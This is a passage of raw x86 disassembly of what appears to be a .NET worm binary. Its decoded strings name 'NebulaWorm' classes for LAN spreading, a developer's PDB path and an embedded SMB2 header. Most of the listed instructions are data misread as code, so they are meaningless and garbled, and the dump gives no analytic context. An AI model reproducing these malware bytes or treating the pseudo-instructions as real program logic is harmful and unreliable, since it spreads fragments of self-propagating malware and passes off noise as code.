  40b356:	6b 65 43 6f          	imul   $0x6f,0x43(%ebp),%esp
  40b35a:	6e                   	outsb  %ds:(%esi),(%dx)
  40b35b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b35c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40b361:	6e                   	outsb  %ds:(%esi),(%dx)
  40b362:	41                   	inc    %ecx
  40b363:	73 79                	jae    0x40b3de
  40b365:	6e                   	outsb  %ds:(%esi),(%dx)
  40b366:	63 3e                	arpl   %edi,(%esi)
  40b368:	64 5f                	fs pop %edi
  40b36a:	5f                   	pop    %edi
  40b36b:	35 00 00 2f 01       	xor    $0x12f0000,%eax
  40b370:	00 2a                	add    %ch,(%edx)
  40b372:	4e                   	dec    %esi
  40b373:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b377:	61                   	popa
  40b378:	57                   	push   %edi
  40b379:	6f                   	outsl  %ds:(%esi),(%dx)
  40b37a:	72 6d                	jb     0x40b3e9
  40b37c:	2e 53                	cs push %ebx
  40b37e:	70 72                	jo     0x40b3f2
  40b380:	65 61                	gs popa
  40b382:	64 69 6e 67 2b 3c 53 	imul   $0x70533c2b,%fs:0x67(%esi),%ebp
  40b389:	70 
  40b38a:	72 65                	jb     0x40b3f1
  40b38c:	61                   	popa
  40b38d:	64 4f                	fs dec %edi
  40b38f:	6e                   	outsb  %ds:(%esi),(%dx)
  40b390:	63 65 41             	arpl   %esp,0x41(%ebp)
  40b393:	73 79                	jae    0x40b40e
  40b395:	6e                   	outsb  %ds:(%esi),(%dx)
  40b396:	63 3e                	arpl   %edi,(%esi)
  40b398:	64 5f                	fs pop %edi
  40b39a:	5f                   	pop    %edi
  40b39b:	36 00 00             	add    %al,%ss:(%eax)
  40b39e:	43                   	inc    %ebx
  40b39f:	01 00                	add    %eax,(%eax)
  40b3a1:	3e 4e                	ds dec %esi
  40b3a3:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b3a7:	61                   	popa
  40b3a8:	57                   	push   %edi
  40b3a9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3aa:	72 6d                	jb     0x40b419
  40b3ac:	2e 4c                	cs dec %esp
  40b3ae:	61                   	popa
  40b3af:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3b0:	53                   	push   %ebx
  40b3b1:	70 72                	jo     0x40b425
  40b3b3:	65 61                	gs popa
  40b3b5:	64 2b 3c 3e          	sub    %fs:(%esi,%edi,1),%edi
  40b3b9:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40b3bc:	44                   	inc    %esp
  40b3bd:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  40b3c4:	6c                   	insb   (%dx),%es:(%edi)
  40b3c5:	61                   	popa
  40b3c6:	73 73                	jae    0x40b43b
  40b3c8:	38 5f 31             	cmp    %bl,0x31(%edi)
  40b3cb:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  40b3ce:	53                   	push   %ebx
  40b3cf:	70 72                	jo     0x40b443
  40b3d1:	65 61                	gs popa
  40b3d3:	64 41                	fs inc %ecx
  40b3d5:	73 79                	jae    0x40b450
  40b3d7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3d8:	63 3e                	arpl   %edi,(%esi)
  40b3da:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40b3dd:	31 3e                	xor    %edi,(%esi)
  40b3df:	64 00 00             	add    %al,%fs:(%eax)
  40b3e2:	2b 01                	sub    (%ecx),%eax
  40b3e4:	00 26                	add    %ah,(%esi)
  40b3e6:	4e                   	dec    %esi
  40b3e7:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b3eb:	61                   	popa
  40b3ec:	57                   	push   %edi
  40b3ed:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3ee:	72 6d                	jb     0x40b45d
  40b3f0:	2e 53                	cs push %ebx
  40b3f2:	6c                   	insb   (%dx),%es:(%edi)
  40b3f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3f4:	77 57                	ja     0x40b44d
  40b3f6:	69 2b 3c 3e 63 2b    	imul   $0x2b633e3c,(%ebx),%ebp
  40b3fc:	3c 3c                	cmp    $0x3c,%al
  40b3fe:	53                   	push   %ebx
  40b3ff:	74 61                	je     0x40b462
  40b401:	72 74                	jb     0x40b477
  40b403:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40b407:	33 5f 30             	xor    0x30(%edi),%ebx
  40b40a:	3e 64 00 00          	ds add %al,%fs:(%eax)
  40b40e:	37                   	aaa
  40b40f:	01 00                	add    %eax,(%eax)
  40b411:	32 4e 65             	xor    0x65(%esi),%cl
  40b414:	62 75 6c             	bound  %esi,0x6c(%ebp)
  40b417:	61                   	popa
  40b418:	57                   	push   %edi
  40b419:	6f                   	outsl  %ds:(%esi),(%dx)
  40b41a:	72 6d                	jb     0x40b489
  40b41c:	2e 53                	cs push %ebx
  40b41e:	70 72                	jo     0x40b492
  40b420:	65 61                	gs popa
  40b422:	64 69 6e 67 2b 3c 3e 	imul   $0x633e3c2b,%fs:0x67(%esi),%ebp
  40b429:	63 
  40b42a:	2b 3c 3c             	sub    (%esp,%edi,1),%edi
  40b42d:	53                   	push   %ebx
  40b42e:	74 61                	je     0x40b491
  40b430:	72 74                	jb     0x40b4a6
  40b432:	53                   	push   %ebx
  40b433:	70 72                	jo     0x40b4a7
  40b435:	65 61                	gs popa
  40b437:	64 69 6e 67 3e 62 5f 	imul   $0x5f5f623e,%fs:0x67(%esi),%ebp
  40b43e:	5f 
  40b43f:	34 5f                	xor    $0x5f,%al
  40b441:	30 3e                	xor    %bh,(%esi)
  40b443:	64 00 00             	add    %al,%fs:(%eax)
  40b446:	00 00                	add    %al,(%eax)
  40b448:	00 00                	add    %al,(%eax)
  40b44a:	00 00                	add    %al,(%eax)
  40b44c:	3c a8                	cmp    $0xa8,%al
  40b44e:	ed                   	in     (%dx),%eax
  40b44f:	d4 00                	aam    $0x0
  40b451:	00 00                	add    %al,(%eax)
  40b453:	00 02                	add    %al,(%edx)
  40b455:	00 00                	add    %al,(%eax)
  40b457:	00 60 00             	add    %ah,0x0(%eax)
  40b45a:	00 00                	add    %al,(%eax)
  40b45c:	80 b4 00 00 80 96 00 	xorb   $0x0,0x968000(%eax,%eax,1)
  40b463:	00 
	...
  40b470:	10 00                	adc    %al,(%eax)
	...
  40b47e:	00 00                	add    %al,(%eax)
  40b480:	52                   	push   %edx
  40b481:	53                   	push   %ebx
  40b482:	44                   	inc    %esp
  40b483:	53                   	push   %ebx
  40b484:	d2 68 34             	shrb   %cl,0x34(%eax)
  40b487:	c9                   	leave
  40b488:	6b 34 7b 4e          	imul   $0x4e,(%ebx,%edi,2),%esi
  40b48c:	8b 06                	mov    (%esi),%eax
  40b48e:	88 ce                	mov    %cl,%dh
  40b490:	d7                   	xlat   %ds:(%ebx)
  40b491:	2f                   	das
  40b492:	dc 7d 01             	fdivrl 0x1(%ebp)
  40b495:	00 00                	add    %al,(%eax)
  40b497:	00 43 3a             	add    %al,0x3a(%ebx)
  40b49a:	5c                   	pop    %esp
  40b49b:	55                   	push   %ebp
  40b49c:	73 65                	jae    0x40b503
  40b49e:	72 73                	jb     0x40b513
  40b4a0:	5c                   	pop    %esp
  40b4a1:	49                   	dec    %ecx
  40b4a2:	7a 6f                	jp     0x40b513
  40b4a4:	6c                   	insb   (%dx),%es:(%edi)
  40b4a5:	79 5c                	jns    0x40b503
  40b4a7:	44                   	inc    %esp
  40b4a8:	65 73 6b             	gs jae 0x40b516
  40b4ab:	74 6f                	je     0x40b51c
  40b4ad:	70 5c                	jo     0x40b50b
  40b4af:	4e                   	dec    %esi
  40b4b0:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b4b4:	61                   	popa
  40b4b5:	57                   	push   %edi
  40b4b6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4b7:	72 6d                	jb     0x40b526
  40b4b9:	5c                   	pop    %esp
  40b4ba:	4e                   	dec    %esi
  40b4bb:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b4bf:	61                   	popa
  40b4c0:	57                   	push   %edi
  40b4c1:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4c2:	72 6d                	jb     0x40b531
  40b4c4:	5c                   	pop    %esp
  40b4c5:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4c6:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  40b4c9:	52                   	push   %edx
  40b4ca:	65 6c                	gs insb (%dx),%es:(%edi)
  40b4cc:	65 61                	gs popa
  40b4ce:	73 65                	jae    0x40b535
  40b4d0:	5c                   	pop    %esp
  40b4d1:	4e                   	dec    %esi
  40b4d2:	65 62 75 6c          	bound  %esi,%gs:0x6c(%ebp)
  40b4d6:	61                   	popa
  40b4d7:	57                   	push   %edi
  40b4d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4d9:	72 6d                	jb     0x40b548
  40b4db:	2e 70 64             	jo,pn  0x40b542
  40b4de:	62 00                	bound  %eax,(%eax)
  40b4e0:	08 b5 00 00 00 00    	or     %dh,0x0(%ebp)
  40b4e6:	00 00                	add    %al,(%eax)
  40b4e8:	00 00                	add    %al,(%eax)
  40b4ea:	00 00                	add    %al,(%eax)
  40b4ec:	22 b5 00 00 00 20    	and    0x20000000(%ebp),%dh
	...
  40b506:	00 00                	add    %al,(%eax)
  40b508:	14 b5                	adc    $0xb5,%al
	...
  40b516:	5f                   	pop    %edi
  40b517:	43                   	inc    %ebx
  40b518:	6f                   	outsl  %ds:(%esi),(%dx)
  40b519:	72 45                	jb     0x40b560
  40b51b:	78 65                	js     0x40b582
  40b51d:	4d                   	dec    %ebp
  40b51e:	61                   	popa
  40b51f:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40b526:	72 65                	jb     0x40b58d
  40b528:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40b52c:	6c                   	insb   (%dx),%es:(%edi)
  40b52d:	00 00                	add    %al,(%eax)
  40b52f:	00 00                	add    %al,(%eax)
  40b531:	00 ff                	add    %bh,%bh
  40b533:	25 00 20 40 00       	and    $0x402000,%eax
  40b538:	31 c0                	xor    %eax,%eax
  40b53a:	c3                   	ret
	...
  40b543:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40b544:	fe                   	(bad)
  40b545:	53                   	push   %ebx
  40b546:	4d                   	dec    %ebp
  40b547:	42                   	inc    %edx
  40b548:	40                   	inc    %eax
  40b549:	00 00                	add    %al,(%eax)
  40b54b:	00 00                	add    %al,(%eax)
  40b54d:	00 01                	add    %al,(%ecx)
	...
  40b557:	00 00                	add    %al,(%eax)
  40b559:	00 24 00             	add    %ah,(%eax,%eax,1)
  40b55c:	00 00                	add    %al,(%eax)
  40b55e:	02 00                	add    (%eax),%al
  40b560:	0c 00                	or     $0x0,%al
  40b562:	01 00                	add    %eax,(%eax)
  40b564:	00 00                	add    %al,(%eax)
  40b566:	00 00                	add    %al,(%eax)
  40b568:	00 00                	add    %al,(%eax)
  40b56a:	7f 00                	jg     0x40b56c
  40b56c:	00 00                	add    %al,(%eax)
  40b56e:	00 00                	add    %al,(%eax)
  40b570:	00 00                	add    %al,(%eax)
  40b572:	10 00                	adc    %al,(%eax)
  40b574:	00 00                	add    %al,(%eax)
  40b576:	02 02                	add    (%edx),%al
  40b578:	10 02                	adc    %al,(%edx)
  40b57a:	22 02                	and    (%edx),%al
  40b57c:	24 02                	and    $0x2,%al
  40b57e:	00 03                	add    %al,(%ebx)
  40b580:	02 03                	add    (%ebx),%al
  40b582:	10 03                	adc    %al,(%ebx)
  40b584:	11 03                	adc    %eax,(%ebx)
  40b586:	00 00                	add    %al,(%eax)
  40b588:	12 03                	adc    (%ebx),%al
  40b58a:	00 01                	add    %al,(%ecx)
	...
  40b594:	00 00                	add    %al,(%eax)
  40b596:	78 00                	js     0x40b598
  40b598:	00 00                	add    %al,(%eax)
  40b59a:	01 00                	add    %eax,(%eax)
  40b59c:	26 00 00             	add    %al,%es:(%eax)
  40b59f:	00 00                	add    %al,(%eax)
  40b5a1:	00 01                	add    %al,(%ecx)
  40b5a3:	00 20                	add    %ah,(%eax)
  40b5a5:	00 00                	add    %al,(%eax)
  40b5a7:	00 00                	add    %al,(%eax)
  40b5a9:	00 03                	add    %al,(%ebx)
  40b5ab:	00 00                	add    %al,(%eax)
  40b5ad:	00 01                	add    %al,(%ecx)
  40b5af:	00 00                	add    %al,(%eax)
  40b5b1:	00 02                	add    %al,(%edx)
  40b5b3:	00 00                	add    %al,(%eax)
  40b5b5:	00 03                	add    %al,(%ebx)
	...
